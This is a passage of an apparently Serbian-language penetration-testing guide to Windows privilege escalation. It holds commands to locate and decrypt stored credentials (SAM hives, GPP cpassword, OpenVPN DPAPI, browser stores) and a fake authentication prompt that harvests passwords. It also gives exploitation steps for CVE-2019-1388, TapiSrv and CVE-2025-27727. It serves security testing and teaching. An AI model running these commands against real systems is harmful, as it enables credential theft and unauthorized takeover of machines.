%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Čitljive rezervne kopije Windows Imaging (`.wim`) mogu da sadrže i offline `SAM`, `SECURITY` i `SYSTEM` hive-ove. Dajte prednost lokalno dostupnim direktorijumima sa rezervnim kopijama ili image-ovima i pregledajte **nazive članova** image-a pre izdvajanja bilo čega; samo ime `.wim` datoteke ne dokazuje da su hive-ovi izloženi, a uobičajeni `install.wim`, `boot.wim` i recovery image-ovi često su pogrešni tragovi. SMB share je zaseban put za pristup i treba ga proveriti samo ako je taj share u obuhvatu. Pogledajte Microsoft-ove [smernice za Windows image-ove](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) i [referencu za registry hive datoteke](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Cloud akreditivi

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Potražite datoteku pod nazivom **SiteList.xml**

### Keširana GPP lozinka

Ranije je postojala funkcija koja je omogućavala postavljanje prilagođenih lokalnih administratorskih naloga na grupi mašina putem Group Policy Preferences (GPP). Međutim, ovaj metod imao je ozbiljne bezbednosne nedostatke. Prvo, Group Policy Objects (GPOs), sačuvani kao XML datoteke u SYSVOL-u, bili su dostupni svakom korisniku domena. Drugo, lozinke u ovim GPP-ovima, šifrovane pomoću AES256 algoritma sa javno dokumentovanim podrazumevanim ključem, mogao je da dešifruje svaki autentifikovani korisnik. To je predstavljalo ozbiljan rizik jer je korisnicima moglo da omogući sticanje povišenih privilegija.

Da bi se ovaj rizik ublažio, razvijena je funkcija koja pretražuje lokalno keširane GPP datoteke i pronalazi one koje sadrže neprazno polje "cpassword". Kada pronađe takvu datoteku, funkcija dešifruje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat sadrži detalje o GPP-u i lokaciji datoteke, što pomaže u identifikovanju i otklanjanju ove bezbednosne ranjivosti.

Potražite ove datoteke u `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre Windows Viste)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Da biste dešifrovali cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Korišćenje alata crackmapexec za pribavljanje lozinki:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web konfiguracija

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Primer web.config datoteke sa podacima za autentifikaciju:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Rezervne arhive u IIS webroot-u

Stara ZIP rezervna kopija postavljena direktno u webroot koji se servira može da otkrije prethodne konfiguracione datoteke i ponovo upotrebljive akreditive. Proverite fizičku putanju podešenu za sajt i da li je arhiva zaista dostupna preko HTTP-a pre nego što je smatrate izloženošću. Podrazumevana putanja `C:\inetpub\wwwroot` samo je moguća lokacija. Brzi lokalni popis može da prikaže nazive i veličine bez otvaranja arhiva:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Naziv arhive ne dokazuje da ona sadrži tajnu niti da pronađeni kredencijal omogućava viši nivo privilegija.

### OpenVPN credentials

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Logs

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Zatražite kredencijale

Uvek možete **zatražiti od korisnika da unese svoje kredencijale ili čak kredencijale drugog korisnika** ako mislite da ih zna (imajte na umu da je direktno **traženje** **kredencijala** od klijenta zaista **rizično**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mogući nazivi datoteka koje sadrže pristupne podatke**

Poznate datoteke koje su ranije sadržale **lozinke** u **običnom tekstu** ili Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 baze podataka obično koriste ekstenziju `.psafe3`. Datoteku sa odgovarajućim imenom tretirajte kao mogući šifrovani trezor; samo njeno prisustvo ne znači da možete da je pročitate, otključate ili koristite sačuvane kredencijale. Kada proveravate gde se takve datoteke čuvaju, pregledajte dostupne korisničke profile i konfigurisane korene deljenih datoteka.

Čitljiv KeePass `.kdbx` je takođe samo naznaka da postoji šifrovani trezor. Za njegovo otključavanje potrebni su stvarna master-password i sve konfigurisane key-file ili account provere. Ako ovlašćena provera pronađe par LM:NT hash vrednosti u unosu, proverite navedeni account i da li je NT hash aktuelan i prihvaćen na NTLM servisu cilja pre nego što razmotrite [pass-the-hash](../ntlm/README.md#pass-the-hash). Unos u trezoru sam po sebi ne daje prava Administrator ili SYSTEM; moraju biti ispunjeni i uslovi za udaljeni pristup servisu, prava account-a i svaki zaseban korak za izvršavanje servisa. U inventaru treba navesti putanju do trezora i da li je čitljiv, a ne ispisivati bazu podataka ili sačuvane kredencijale.

Pretražite sve predložene datoteke:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Kredencijali u korpi za otpatke

Proverite dostupne stavke u korpi za otpatke i potražite obrisane rezervne kopije i arhive konfiguracije, kao i datoteke čiji nazivi izričito pominju kredencijale. Korisna `.7z`, `.zip` ili `.rar` rezervna kopija može biti stara i po nekoliko meseci i imati običan naziv. Windows čuva originalnu putanju i vreme brisanja u `$I` zapisu, a obrisanu datoteku kao upareni `$R` unos; pre otvaranja arhive pregledajte metapodatke i proverite da li trenutni identitet ima dozvolu za čitanje. Vidljivost zavisi od volumena, korisničkog SID-a i dozvola za datoteke, pa prazna lista ne dokazuje da ne postoji nijedna obnovljiva rezervna kopija. Naziv arhive tretirajte kao razlog za proveru, a ne kao dokaz da sadrži ispravan tajni podatak.

Dostupan obrisani `.pfx` može biti i trag za **code-signing**. Ako sadrži dostupan privatni ključ, taj ključ može da potpiše izmenjenu PowerShell skriptu; [PowerShell zahteva sertifikat za code-signing sa privatnim ključem](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [AppLocker publisher rules proveravaju identitet potpisnika i opseg pravila](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Izvršavanje pod drugim nalogom zahteva da trenutni identitet može da izmeni tačno određenu skriptu, da važeće pravilo prihvata nastali potpis za tu skriptu i ciljni nalog, kao i da zakazani zadatak ili drugi potrošač sa višim privilegijama zaista pokreće skriptu. Sam naziv datoteke `.pfx`, predmet sertifikata ili mogućnost izmene skripte ne dokazuju da je ovaj lanac uspostavljen. Pre otvaranja materijala sa privatnim ključem ili pokretanja zadatka pregledajte metapodatke, ACL-ove, pravila i komandu zakazanog zadatka.

Pregledajte i dostupne baze podataka profila klijenata za razmenu poruka, beleške i primljene datoteke u potrazi za tragovima kredencijala. Izvoz BitLocker ključa za oporavak može biti sačuvan kao HTML ili TXT, ponekad unutar arhive rezervne kopije sa odgovarajućim nazivom. Takav materijal može omogućiti pristup zasebnom šifrovanom volumenu sa starijim rezervnim kopijama; volumen i arhivu pregledajte samo ako imate ovlašćenje za pristup. Ako rezervna kopija sadrži `NTDS.dit`, oporavak domenskih kredencijala van mreže zahteva i odgovarajući `SYSTEM` hive, kao što je opisano u [postupku za rezervne kopije i privilegovane grupe](../active-directory-methodology/privileged-groups-and-token-privileges.md). Sami nazivi datoteka i zaključan volumen ne dokazuju da postoji upotrebljiv ključ za oporavak ili rezervna kopija domena.

Za **oporavak lozinki** sačuvanih u nekoliko programa možete koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Unutar registry-ja

**Drugi mogući ključevi u registry-ju koji sadrže kredencijale**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Izdvojite OpenSSH ključeve iz registra.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pregledača

Proverite baze podataka u kojima se čuvaju lozinke iz pregledača **Chrome, Edge ili Firefox**.\
Proverite i istoriju, obeleživače i omiljene stranice pregledača — možda su tamo sačuvane neke **lozinke**.

Za uobičajeni profil **Default** trenutnog korisnika u Edge-u, `Login Data` se nalazi u `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, dok se `Local State` nalazi u nadređenom direktorijumu `User Data`. [Microsoft dokumentuje podrazumevanu lokaciju profila](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); drugi profil ili smernica `UserDataDir` mogu da je promene. Samo prisustvo datoteka ukazuje na moguću lokaciju sačuvanih akreditiva: proverite da li su datoteke čitljive, da li imate odgovarajući DPAPI kontekst korisnika ili drugi ovlašćeni ključni materijal i da li sačavljena prijava pripada nalogu sa višim privilegijama. Enumeracija koja proverava samo putanje ne mora da otvara bazu podataka niti da prikazuje dešifrovane lozinke.

Za Firefox, [Mozilla dokumentuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) da su `key4.db` i `logins.json` u profilu uparene datoteke sa ključem i šifrovanim prijavama. Njihovo prisustvo samo ukazuje na moguću lokaciju akreditiva: proverite da li su obe datoteke čitljive, da li postoje sačuvani unosi i da li ključ štiti Primary Password pre nego što zaključite da se akreditivi mogu koristiti. Ako pronađeni akreditiv pripada domenskom nalogu, zasebno proverite efektivna prava tog naloga za upravljanje grupama i [prava grupe za čitanje ili dešifrovanje LAPS lozinke](../active-directory-methodology/laps.md); sami artefakti pregledača ne dokazuju put do administratorskih privilegija.

Alatke za izdvajanje lozinki iz pregledača:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** je tehnologija ugrađena u operativni sistem Windows koja omogućava **međusobnu komunikaciju** između softverskih komponenti napisanih na različitim jezicima. Svaka COM komponenta **identifikuje se ID-jem klase (CLSID)**, a svaka komponenta izlaže funkcionalnost putem jednog ili više interfejsa, identifikovanih ID-jevima interfejsa (IID).

COM klase i interfejsi definisani su u registru, redom pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**. Ovaj registar nastaje spajanjem **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Unutar CLSID-ova ovog registra možete pronaći podključ registra **InProcServer32**, koji sadrži **podrazumevanu vrednost** koja upućuje na **DLL** i vrednost pod nazivom **ThreadingModel**, čija vrednost može biti **Apartment** (jedna nit), **Free** (više niti), **Both** (jedna ili više niti) ili **Neutral** (neutralno u odnosu na niti).

![Istorija pregledača - COM DLL Overwriting: Unutar CLSID-ova ovog registra možete pronaći podključ registra InProcServer32, koji sadrži podrazumevanu vrednost koja upućuje na DLL i vrednost...](<../../images/image (729).png>)

U suštini, ako možete da **prepišete bilo koju DLL datoteku** koja će biti izvršena, mogli biste da **eskalirate privilegije** ako tu DLL datoteku izvršava drugi korisnik.

Da biste saznali kako napadači koriste COM Hijacking kao mehanizam za održavanje pristupa, pogledajte:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Opšta pretraga lozinki u datotekama i registru**

**Pretraživanje sadržaja datoteka**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Potražite datoteku određenog imena**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Pretražite registry u potrazi za nazivima ključeva i lozinkama**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Alati koji pretražuju lozinke

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **je msf dodatak** koji sam napravio; automatski pokreće svaki Metasploit POST modul koji traži akreditive na žrtvinom sistemu.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski pretražuje sve datoteke koje sadrže lozinke navedene na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan odličan alat za izdvajanje lozinki iz sistema.

Alat [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) pretražuje **sesije**, **korisnička imena** i **lozinke** za nekoliko alata koji čuvaju ove podatke u otvorenom tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Zamislite da **proces koji se izvršava kao SYSTEM otvori novi proces** (`OpenProcess()`) sa **punim pristupom**. Isti proces **takođe kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama, ali tako da nasledi sve otvorene handle-ove glavnog procesa**.\
Zatim, ako imate **pun pristup procesu sa niskim privilegijama**, možete da preuzmete **otvoreni handle do privilegovanog procesa kreiranog pomoću** `OpenProcess()` **i ubacite shellcode**.\
[Pročitajte ovaj primer da biste saznali više o tome **kako da otkrijete i iskoristite ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pročitajte i [**ovu drugu objavu**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/), koja detaljnije objašnjava kako da testirate i zloupotrebite dodatne otvorene handle-ove procesa i niti nasleđene sa različitim nivoima dozvola (ne samo sa punim pristupom).](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenti deljene memorije, poznati kao **pipes**, omogućavaju komunikaciju između procesa i prenos podataka.

Windows pruža funkciju pod nazivom **Named Pipes**, koja omogućava nepovezanim procesima da dele podatke, čak i preko različitih mreža. Ovo podseća na arhitekturu klijent/server, sa ulogama definisanim kao **named pipe server** i **named pipe client**.

Kada **klijent** pošalje podatke kroz pipe, **server** koji je podesio pipe može da **preuzme identitet** **klijenta**, pod uslovom da ima neophodna **SeImpersonate** prava. Ako identifikujete **privilegovani proces** koji komunicira preko pipe-a koji možete da oponašate, možete da **povećate privilegije** tako što ćete preuzeti identitet tog procesa kada stupi u interakciju sa pipe-om koji ste uspostavili. Uputstva za izvođenje ovakvog napada potražite [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).

Sledeća alatka omogućava i **presretanje komunikacije preko named pipe-a pomoću alatke poput burp-a:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **, a ova alatka omogućava izlistavanje i pregled svih pipe-ova radi pronalaženja privesc vektora** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony servis (TapiSrv) u serverskom režimu izlaže `\\pipe\\tapsrv` (MS-TRP). Udaljeni autentifikovani klijent može da zloupotrebi asinhroni put događaja zasnovan na mailslot-u i pretvori `ClientAttach` u proizvoljan **upis od 4 bajta** u bilo koju postojeću datoteku u koju `NETWORK SERVICE` može da upisuje, a zatim dobije administratorska prava za Telephony i učita proizvoljan DLL kao servis. Ceo postupak:

- Pozovite `ClientAttach` sa `pszDomainUser` postavljenim na postojeću putanju u koju može da se upisuje → servis je otvara pomoću `CreateFileW(..., OPEN_EXISTING)` i koristi za asinhrone upise događaja.
- Svaki događaj upisuje napadačevu kontrolisanu vrednost `InitContext` iz `Initialize` u taj handle. Registrujte line aplikaciju pomoću `LRegisterRequestRecipient` (`Req_Func 61`), pokrenite `TRequestMakeCall` (`Req_Func 121`), preuzmite podatke pomoću `GetAsyncEvents` (`Req_Func 0`), a zatim je odjavite/isključite da biste ponovili determinističke upise.
- Dodajte sebe u `[TapiAdministrators]` u `C:\Windows\TAPI\tsec.ini`, ponovo se povežite, a zatim pozovite `GetUIDllName` sa proizvoljnom putanjom do DLL-a da biste izvršili `TSPI_providerUIIdentify` kao `NETWORK SERVICE`.

Više detalja:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Razno

### Ekstenzije datoteka koje mogu da izvršavaju sadržaj u Windows-u

Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**

### Zloupotreba protocol handler-a / ShellExecute-a preko Markdown renderera

Klikabilni Markdown linkovi prosleđeni funkciji `ShellExecuteExW` mogu da pokrenu opasne URI handler-e (`file:`, `ms-appinstaller:` ili bilo koju registrovanu šemu) i izvrše datoteke koje kontroliše napadač kao trenutni korisnik. Pogledajte:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Nadgledanje komandnih linija radi pronalaženja lozinki**

Kada dobijete shell kao korisnik, moguće je da postoje zakazani zadaci ili drugi procesi koji se izvršavaju i **prosleđuju akreditive kroz komandnu liniju**. Skripta u nastavku beleži komandne linije procesa svake dve sekunde i poredi trenutno stanje sa prethodnim, prikazujući sve razlike.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Krađa lozinki iz procesa

## Od korisnika sa niskim privilegijama do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (preko konzole ili RDP-a) i UAC je omogućen, u nekim verzijama Microsoft Windows-a moguće je pokrenuti terminal ili bilo koji drugi proces kao „NT\AUTHORITY SYSTEM“ iz neprivilegovanog korisničkog naloga.

To omogućava eskalaciju privilegija i istovremeno zaobilaženje UAC-a korišćenjem iste ranjivosti. Pored toga, ništa ne morate da instalirate, a binarnu datoteku koja se koristi tokom procesa potpisao je i izdao Microsoft.

Neki od pogođenih sistema su:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Da bi se ova ranjivost iskoristila, potrebno je izvršiti sledeće korake:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Imate sve potrebne datoteke i informacije u ovom GitHub repozitorijumu:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od Administrator Medium do High Integrity Level / UAC bypass

Pročitajte ovo da biste **naučili o nivoima integriteta**:


{{#ref}}
integrity-levels.md
{{#endref}}

Zatim **pročitajte ovo da biste naučili o UAC-u i UAC bypass-ima:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Upload direktorijumi sa junction-ima unutar direktorijuma koje opslužuje web server

Aplikacija može da kreira predvidljiv poddirektorijum za upload, upiše u njega naziv datoteke koji je obezbedio pozivalac, a zatim obradi tu datoteku. Ako korisnik sa niskim privilegijama može da ukloni taj poddirektorijum i zameni ga NTFS junction-om pre upisa sa strane servera, upis može preko junction-a završiti u direktorijumu koji opslužuje web server. Skripta postavljena tamo može da se izvrši kao identitet web-servisa ako server izvršava tu vrstu datoteke. Ovo je granica proizvoljnog upisa specifična za aplikaciju; direktorijum za upload sa dozvolom za upis ili postojeći junction sami po sebi nisu dokaz da je to moguće.

Proverite tačnu konstrukciju putanje i tajming u handler-u za upload, efektivne dozvole korisnika za brisanje/kreiranje poddirektorijuma, efektivne ACL-ove odredišta, da li writer prati reparse point-ove i da li web server izvršava datoteke u tom odredištu. Zasebno potvrdite identitete procesa writer-a i web servera. Pasivni inventar može da prikaže ACL-ove direktorijuma i reparse metapodatke, ali ne može da utvrdi ponašanje handler-a ili buduću zamenu junction-a. Ako se izvršavanje odvija pod nalogom servisa, pregledajte **stvarni token procesa** pre nego što razmotrite zasebnu putanju za iskorišćavanje privilegija tokena.

## Od proizvoljnog brisanja/premeštanja/preimenovanja fascikli do SYSTEM EoP

Tehnika opisana [**u ovom blog postu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), sa exploit kodom [**dostupnim ovde**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Napad se u osnovi sastoji od zloupotrebe Windows Installer-ove funkcije vraćanja promena kako bi se legitimne datoteke zamenile zlonamernim tokom procesa deinstalacije. Za to napadač mora da napravi **zlonamerni MSI installer** koji će se koristiti za preotimanje fascikle `C:\Config.Msi`, koju će Windows Installer kasnije koristiti za čuvanje datoteka za vraćanje promena tokom deinstalacije drugih MSI paketa. Datoteke za vraćanje promena biće izmenjene tako da sadrže zlonamerni payload.

### Windows Installer COM ubacivanje putanje za čišćenje (CVE-2025-27727)

Klijent sa niskim privilegijama može da pristupi SYSTEM servisu `msiexec.exe` preko COM objekta `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Reverzno inženjerstvo je identifikovalo relevantne `IMsiServer` pozive kao `MsiBeginTransactionW` na vtable offset-u `0xA0`, `SetEEUIDirectoryAndFilter` na `0xC8` i `CleanupTempPackages` na `0x50`. Ovi nazivi i offset-i dobijeni su reverznim inženjerstvom i mogu da se razlikuju među verzijama.<sup>[[41]](#references)</sup>

Za korisnika koji nije administrator, `SetEEUIDirectoryAndFilter` impersonira pozivaoca samo dok otvara navedenu putanju sa `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` i `FILE_FLAG_OPEN_REPARSE_POINT`. Time se potvrđuje da pozivalac može da obriše direktorijum i izbegava praćenje reparse point-a, ali se **ne** vezuje provereni objekat datoteke za kasnije čišćenje niti dokazuje da ga je kreirao Windows Installer.<sup>[[41]](#references)</sup>

Nakon `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` zakazuje putanju kao fasciklu, bez obzira na argument filter-a koji je prosledio pozivalac. Servis upisuje imenovanu vrednost `REG_DWORD` u `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: ime vrednosti je putanja koju kontroliše pozivalac, a podatak `0x00000002` predstavlja oznaku fascikle. `CleanupTempPackages(NULL, FALSE)` zatim direktno pokreće čišćenje. Njegov povišeni worker nabraja vrednosti registra i prosleđuje stavke koje su fascikle rekurzivnoj funkciji `FDeleteFolder`, bez provere porekla putanje. Ako uobičajeno uklanjanje ne uspe, kod poziva i `LockdownPath`, briše atribute datoteke i ponavlja pokušaj.<sup>[[41]](#references)</sup>

Minimalni niz poziva rekonstruisan iz `msi.dll` je:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Korisni primitiv je ponovno korišćenje putanje, a ne preusmeravanje junction-om. Registrujte `C:\Config.Msi` koji je napravio napadač, uklonite ga i sačekajte da ga Windows Installer kasnije ponovo napravi na istoj putanji sa zaštićenim rollback podacima. Čišćenje veruje zastarelom imenu `TempPackages` i briše novi direktorijum kao SYSTEM. Time se zaobilaze predviđena ograničenja koja nameću `FILE_FLAG_OPEN_REPARSE_POINT` i ublažavanje rizika poverenja u preusmeravanje, jer reparse point nije potreban.<sup>[[41]](#references)</sup>

